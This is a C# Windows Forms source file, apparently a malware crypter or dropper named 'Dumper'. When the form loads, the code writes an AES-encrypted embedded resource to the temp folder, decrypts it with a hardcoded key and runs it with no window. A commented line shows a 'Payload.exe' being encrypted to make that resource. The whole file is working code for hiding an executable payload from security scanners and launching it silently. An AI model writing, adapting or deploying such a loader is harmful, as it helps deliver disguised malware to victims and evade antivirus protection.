using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Reflection;
using System.Diagnostics;

namespace Dumper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            byte[] key = new byte[32];
            byte[] iv = new byte[16];

            for (int i = 0; i < 32; i++)
                key[i] = (byte)((i + 7 * 9) % 256);

            for (int i = 0; i < 16; i++)
                iv[i] = (byte)(i + 2);

            //EncryptFile("Payload.exe", "tes", key, iv);
            File.WriteAllBytes(System.IO.Path.GetTempPath() + @"\go", Properties.Resources.aset);
            DecryptFile(System.IO.Path.GetTempPath() + @"\go", System.IO.Path.GetTempPath() + @"\asset", key, iv);

            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = System.IO.Path.GetTempPath() + @"\asset";
            p.StartInfo.CreateNoWindow = true;
            p.Start();
        }


        static void EncryptFile(string sInputFilename, string sOutputFilename, byte[] key, byte[] iv)
        {
            FileStream fsInput = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
            FileStream fsEncrypted = new FileStream(sOutputFilename, FileMode.Create, FileAccess.Write);

            using (AesCryptoServiceProvider encryptor = new AesCryptoServiceProvider())
            {
                encryptor.Key = key;
                encryptor.IV = iv;

                ICryptoTransform transform = encryptor.CreateEncryptor();

                using (CryptoStream cryptostream = new CryptoStream(fsEncrypted, transform, CryptoStreamMode.Write))
                {
                    byte[] bytearrayinput = new byte[fsInput.Length];
                    fsInput.Read(bytearrayinput, 0, bytearrayinput.Length);
                    cryptostream.Write(bytearrayinput, 0, bytearrayinput.Length);
                }

                fsInput.Close();
                fsEncrypted.Close();
            }
        }

        static void DecryptFile(string sInputFilename, string sOutputFilename, byte[] key, byte[] iv)
        {
            using (AesCryptoServiceProvider encryptor = new AesCryptoServiceProvider())
            {
                encryptor.Key = key;
                encryptor.IV = iv;

                using (FileStream fsread = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read))
                {
                    using (ICryptoTransform transform = encryptor.CreateDecryptor())
                    {
                        using (CryptoStream cryptostream = new CryptoStream(fsread, transform, CryptoStreamMode.Read))
                        {
                            using (BinaryWriter fsDecrypted = new BinaryWriter(File.Open(sOutputFilename, FileMode.Create)))
                            {
                                byte[] buffer = new byte[1024];
                                var read = cryptostream.Read(buffer, 0, buffer.Length);
                                while (read > 0)
                                {
                                    fsDecrypted.Write(buffer, 0, read);
                                    read = cryptostream.Read(buffer, 0, buffer.Length);
                                }

                                fsDecrypted.Flush();
                                cryptostream.Flush();
                            }
                        }
                    }
                }
            }
        }
    }
}
